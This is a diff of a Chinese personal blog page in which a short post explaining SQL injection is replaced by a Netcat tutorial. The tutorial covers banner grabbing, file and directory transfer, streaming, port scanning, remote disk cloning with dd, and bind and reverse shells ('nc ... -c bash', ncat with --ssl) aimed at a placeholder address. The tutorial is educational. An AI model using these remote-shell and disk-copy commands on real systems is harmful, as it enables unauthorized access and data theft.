@@ -24,29 +24,36 @@
   <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"blog.p1nat.xyz","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="什么是SQL注入SQL注入（英语：SQL Injection），也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。">
+<meta name="description" content="使用TELNET&#x2F;BANNER nc -nv ip port 连接 ip 端口  -n 是跟ip地址不做域名解析 -v 是显示详细信息 head &#x2F; 80端口 如果返回 open  再输入这个命令可以获取http head">
 <meta property="og:type" content="article">
-<meta property="og:title" content="什么是SQL注入">
-<meta property="og:url" content="http://blog.p1nat.xyz/2021/12/28/%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="Netcat的几种常用方式">
+<meta property="og:url" content="http://blog.p1nat.xyz/2021/12/28/NetCat%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/index.html">
 <meta property="og:site_name" content="P1nat&#39;s blog">
-<meta property="og:description" content="什么是SQL注入SQL注入（英语：SQL Injection），也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。">
+<meta property="og:description" content="使用TELNET&#x2F;BANNER nc -nv ip port 连接 ip 端口  -n 是跟ip地址不做域名解析 -v 是显示详细信息 head &#x2F; 80端口 如果返回 open  再输入这个命令可以获取http head">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s4.ax1x.com/2021/12/28/TsrCsx.png">
+<meta property="og:image" content="https://s4.ax1x.com/2021/12/28/TsrFeK.png">
+<meta property="og:image" content="https://s4.ax1x.com/2021/12/28/TsrVFe.png">
+<meta property="og:image" content="https://s4.ax1x.com/2021/12/28/TsrZJH.png">
+<meta property="og:image" content="https://s4.ax1x.com/2021/12/28/TsruQI.png">
+<meta property="og:image" content="https://s4.ax1x.com/2021/12/28/Tsrlef.png">
 <meta property="article:published_time" content="2021-12-27T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-12-28T06:35:57.087Z">
+<meta property="article:modified_time" content="2021-12-28T12:30:19.645Z">
 <meta property="article:author" content="p1nat">
 <meta property="article:tag" content="网络">
-<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="Netcat">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s4.ax1x.com/2021/12/28/TsrCsx.png">
 
 
-<link rel="canonical" href="http://blog.p1nat.xyz/2021/12/28/%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5/">
+<link rel="canonical" href="http://blog.p1nat.xyz/2021/12/28/NetCat%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://blog.p1nat.xyz/2021/12/28/%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5/","path":"2021/12/28/什么是SQL注入/","title":"什么是SQL注入"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://blog.p1nat.xyz/2021/12/28/NetCat%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/","path":"2021/12/28/NetCat的几种用法/","title":"Netcat的几种常用方式"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>什么是SQL注入 | P1nat's blog</title>
+<title>Netcat的几种常用方式 | P1nat's blog</title>
   
 
 
@@ -157,7 +164,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">什么是SQL注入</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TELNET-BANNER"><span class="nav-number">1.1.</span> <span class="nav-text">TELNET&#x2F;BANNER</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%A0%E8%BE%93%E6%96%87%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.</span> <span class="nav-text">传输文本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95"><span class="nav-number">1.3.</span> <span class="nav-text">传输文件&#x2F;目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.4.</span> <span class="nav-text">流媒体服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.5.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98"><span class="nav-number">1.6.</span> <span class="nav-text">远程克隆硬盘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="nav-number">1.7.</span> <span class="nav-text">远程控制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NCAT"><span class="nav-number">1.8.</span> <span class="nav-text">NCAT</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
         <div class="site-overview-wrap sidebar-panel">
@@ -263,7 +270,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.p1nat.xyz/2021/12/28/%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="http://blog.p1nat.xyz/2021/12/28/NetCat%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/upload/author.jpg">
@@ -276,7 +283,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          什么是SQL注入<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/_posts/%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pen-nib"></i></a>
+          Netcat的几种常用方式<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/_posts/NetCat%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pen-nib"></i></a>
         </h1>
 
         <div class="post-meta-container">
@@ -288,7 +295,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-12-28 00:00:00 / 修改时间：14:35:57" itemprop="dateCreated datePublished" datetime="2021-12-28T00:00:00+08:00">2021-12-28</time>
+      <time title="创建时间：2021-12-28 00:00:00 / 修改时间：20:30:19" itemprop="dateCreated datePublished" datetime="2021-12-28T00:00:00+08:00">2021-12-28</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -296,12 +303,12 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a>
+          <a href="/categories/Netcat/" itemprop="url" rel="index"><span itemprop="name">Netcat</span></a>
         </span>
     </span>
 
   
-    <span id="/2021/12/28/%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5/" class="post-meta-item leancloud_visitors" data-flag-title="什么是SQL注入" title="阅读次数">
+    <span id="/2021/12/28/NetCat%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/" class="post-meta-item leancloud_visitors" data-flag-title="Netcat的几种常用方式" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -321,14 +328,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>207</span>
+      <span>1.8k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -339,12 +346,91 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h1><p>SQL注入（英语：SQL Injection），也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。</p>
+        <h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="TELNET-BANNER"><a href="#TELNET-BANNER" class="headerlink" title="TELNET/BANNER"></a>TELNET/BANNER</h2><ul>
+<li><code>nc -nv ip port</code> 连接 ip 端口  <code>-n</code> 是跟ip地址不做域名解析 <code>-v</code> 是显示详细信息<ul>
+<li><code>head /</code> 80端口 如果返回 open  再输入这个命令可以获取http head</li>
+</ul>
+</li>
+</ul>
+<hr>
 <span id="more"></span>
-
-
-<p>能改变原有SQL语句的漏洞就是SQL注入</p>
-<p>不论是学习后端开发、数据库、网络安全，SQL注入安全隐患反复被提起</p>
+<h2 id="传输文本信息"><a href="#传输文本信息" class="headerlink" title="传输文本信息"></a>传输文本信息</h2><ul>
+<li>A: <code>nc -l -p 4444</code> A服务器开放一个4444端口侦听（服务端）</li>
+<li>B: <code>nc -nv ip 4444</code> 连接A服务器的4444端口（客户端）<br>  <a target="_blank" rel="noopener" href="https://imgtu.com/i/TsrCsx"><img data-src="https://s4.ax1x.com/2021/12/28/TsrCsx.png" alt="TsrCsx.png"></a></li>
+<li>远程电子取证信息收集<br>  <a target="_blank" rel="noopener" href="https://imgtu.com/i/TsrFeK"><img data-src="https://s4.ax1x.com/2021/12/28/TsrFeK.png" alt="TsrFeK.png"></a><br>  同理  可以 <code>ps aux | nc -nv ip port</code> 输出进程信息 查看有没有可疑的进程<ul>
+<li>写入文件<ul>
+<li>A: <code>nc -l -p 333 &gt; ps.txt</code> 开放端口并将后续收集的信息写入 ps.txt</li>
+<li>B: <code>ps aux | nc -nv ip port -q 1</code>   -q 1的意思是，完成任务后等待1秒退出-断开连接，不退出会一直进行tcp连接无法判断是否未完成</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="传输文件-目录"><a href="#传输文件-目录" class="headerlink" title="传输文件/目录"></a>传输文件/目录</h2><ul>
+<li>相当于是一个可上传文件的 ftp服务器</li>
+<li>传输文件<ul>
+<li>A: <code>nc -lp 333 &gt; 1.mp4 q 1</code> A接收端 侦听333端口 输出到1.mp4 &gt;输出</li>
+<li>B: <code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q -1</code> B发送端 输入文件 到A  &lt;输入<br>正向传输<br><a target="_blank" rel="noopener" href="https://imgtu.com/i/TsrVFe"><img data-src="https://s4.ax1x.com/2021/12/28/TsrVFe.png" alt="TsrVFe.png"></a></li>
+<li>或</li>
+<li>A: <code>nc -q 1 -lp 333 &lt; a.mp4</code> A发送端 输入文件  等待其他连接，如果被连接 文件流入到对方电脑 并在1秒后断开连接</li>
+<li>B: <code>nc -nv 1.1.1.1 333 &gt; a.mp4</code> B接收端和A建立连接 接收A的文件<br>反向传输<br><a target="_blank" rel="noopener" href="https://imgtu.com/i/TsrZJH"><img data-src="https://s4.ax1x.com/2021/12/28/TsrZJH.png" alt="TsrZJH.png"></a></li>
+</ul>
+</li>
+<li>传输目录<ul>
+<li>A: <code>tar -cvf 目录 | nc -lp 333 -q 1</code> A发送 先把前面的目录打包成tar文件，然后开放333端口 等待连接，如果连接 就发送打包的tar包，等待一秒断开连接</li>
+<li>B: <code>nc 1.1.1.1 333 | tar -zxf -</code> B接收 和A建立连接，接收打包的tar 目录，然后进行解压命令，目录就过来了<br>也可以进行反向传输</li>
+</ul>
+</li>
+<li>加密传输<ul>
+<li>A: <code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &lt; 1.mp4</code> A接收端 开放333端口等待连接 接收加密文件，然后将加密的文件内容重定向给 mcrypt解密，解密后在重定向保存成文件</li>
+<li>B: <code>mcrypt --flush -Fbq -a rljndael-256 -m ecb &lt; 1.mp4 | nc -nv 1.1.1.1 333 q 1</code> B发送端 先使用加密算法对 文件内容进行加密，然后把加密后的文件内容作为一个输入，再把加密文件 传输给nc 去连接对方的ip+端口 ，如果对方是等待连接的状态，就会直接发送，成功，等待1秒断开连接<br><a target="_blank" rel="noopener" href="https://imgtu.com/i/TsruQI"><img data-src="https://s4.ax1x.com/2021/12/28/TsruQI.png" alt="TsruQI.png"></a><br>mcrypt 默认是没有安装的，需要自行安装<br><code>apt-get install mcrypt</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h2><ul>
+<li>A: <code>cat 1.mp4 | nc -pl 333</code> A服务端  查看视频文件 给 333端口作为输入</li>
+<li>B: <code>nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code> B客户端 和A建立连接，收到的视频流输出给媒体播放器，媒体播放器作为输出的播放客户端，接收到一点流就播放一点</li>
+</ul>
+<p>mplayer默认没有安装</p>
+<hr>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul>
+<li><code>nc -nvz 1.1.1.1 1-65535</code>   -z扫描模式 默认情况下扫描的是tcp端口</li>
+<li><code>nc -nvzu 1.1.1.1 1-65535</code> -u udp端口  扫描开放的udp端口 </li>
+</ul>
+<hr>
+<h2 id="远程克隆硬盘"><a href="#远程克隆硬盘" class="headerlink" title="远程克隆硬盘"></a>远程克隆硬盘</h2><ul>
+<li>A: <code>nc -lp 333 | dd of=/dev/sda</code> </li>
+<li>B: <code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></li>
+<li>远程电子取证，可以将目标服务器硬盘远程复制，或者内存。</li>
+</ul>
+<hr>
+<h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><ul>
+<li>正向:<ul>
+<li>A: <code>nc -lp 333 -c bash</code> -c 连接一个shell A服务端开放333 传递bash shell</li>
+<li>B: <code>nc 1.1.1.1 333</code> B客户端 连接 控制A bash shell<br>远程控制的权限取决于 发出建立连接的用户<br><a target="_blank" rel="noopener" href="https://imgtu.com/i/Tsrlef"><img data-src="https://s4.ax1x.com/2021/12/28/Tsrlef.png" alt="Tsrlef.png"></a></li>
+</ul>
+</li>
+<li>反向:<ul>
+<li>A: <code>nc -lp 333</code> 开放333端口侦听</li>
+<li>B: <code>nc 1.1.1.1 333 -c bash</code> 把bash shell 传递给A</li>
+</ul>
+</li>
+</ul>
+<p>Windows用户可以把bash改成 cmd；</p>
+<hr>
+<h2 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h2><p>Ncat是用来弥补Netcat缺乏加密和身份验证而开发的</p>
+<ul>
+<li>NC缺乏加密和身份验证的能力</li>
+<li>Ncat包含于nmap工具包中</li>
+<li>A: <code>ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</code> –allow  允许哪个ip地址去连接 <code>-vnl 端口</code> 开放侦听端口 <code>--ssl</code> ssl加密</li>
+<li>B: <code>ncat -nv 1.1.1.1 333 --ssl</code> **连接也要加上 **<code>**--**``ssl</code></li>
+</ul>
+<p>内容全是加密的，即使有第三者进行抓包、嗅探，也看不懂</p>
+<ul>
+<li>不同系统/平台的nc参数功能不尽相同</li>
+</ul>
 
     </div>
 
@@ -358,10 +444,10 @@
       <div class="popular-posts-title"><a href="/2021/12/28/DNS/" rel="bookmark">关于DNS</a></div>
     </li>
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/2021/12/28/NetCat的几种用法/" rel="bookmark">Netcat的几种常用方式</a></div>
+      <div class="popular-posts-title"><a href="/2021/12/28/web是什么/" rel="bookmark">关于Web</a></div>
     </li>
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/2021/12/28/web是什么/" rel="bookmark">关于Web</a></div>
+      <div class="popular-posts-title"><a href="/2021/12/28/什么是SQL注入/" rel="bookmark">什么是SQL注入</a></div>
     </li>
     <li class="popular-posts-item">
       <div class="popular-posts-title"><a href="/2021/12/28/关于端口扫描/" rel="bookmark">关于端口扫描</a></div>
@@ -411,7 +497,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://blog.p1nat.xyz/2021/12/28/%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5/" title="什么是SQL注入">http://blog.p1nat.xyz/2021/12/28/什么是SQL注入/</a>
+      <a href="http://blog.p1nat.xyz/2021/12/28/NetCat%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/" title="Netcat的几种常用方式">http://blog.p1nat.xyz/2021/12/28/NetCat的几种用法/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -448,7 +534,7 @@
 
           <div class="post-tags">
               <a href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag"><i class="fa fa-tag"></i> 网络</a>
-              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
+              <a href="/tags/Netcat/" rel="tag"><i class="fa fa-tag"></i> Netcat</a>
           </div>
 
         
@@ -460,13 +546,13 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/12/28/%E5%85%B3%E4%BA%8E%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" rel="prev" title="关于端口扫描">
-                  <i class="fa fa-chevron-left"></i> 关于端口扫描
+                <a href="/2021/12/28/%E5%9F%9F%E5%90%8D/" rel="prev" title="域名">
+                  <i class="fa fa-chevron-left"></i> 域名
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/12/28/Intruder%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81/" rel="next" title="使用Intruder模块爆破密码">
-                  使用Intruder模块爆破密码 <i class="fa fa-chevron-right"></i>
+                <a href="/2021/12/28/Linux%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" rel="next" title="Linux中的常用命令">
+                  Linux中的常用命令 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
